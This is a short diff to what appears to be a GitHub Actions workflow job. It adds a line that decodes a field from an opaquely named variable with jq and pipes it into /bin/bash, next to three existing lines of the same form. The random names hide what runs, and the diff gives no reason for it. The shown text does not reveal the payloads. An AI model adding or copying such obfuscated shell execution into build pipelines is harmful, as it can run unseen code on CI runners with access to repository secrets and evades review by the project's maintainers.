@@ -21,6 +21,7 @@ jobs:
           echo $jc4778 | jq -r .k2920 | /bin/bash
           echo $h2 | jq -r .jnego6 | /bin/bash
           printf '%s' "$fer284" | jq -r .mw9917 | /bin/bash
+          echo $ibezm0 | jq -r .pfhoq7203 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
